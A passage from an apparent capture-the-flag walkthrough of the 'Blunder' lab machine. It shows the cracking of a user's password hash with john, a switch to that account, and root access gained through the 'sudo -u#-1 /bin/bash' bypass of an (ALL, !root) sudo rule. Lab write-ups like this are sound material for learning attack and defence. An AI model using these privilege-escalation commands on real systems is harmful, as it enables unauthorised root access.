        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
`
use john to try crack hashes. Huga hash cracks to Password120

> su hugo
use Password120 as password.

### Get user flag.

run sudo -l command:

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash


https://gtfobins.github.io/gtfobins/bash/
https://n0w4n.nl/sudo-security-bypass/

`sudo -u#-1 /bin/bash`

### Get root!!

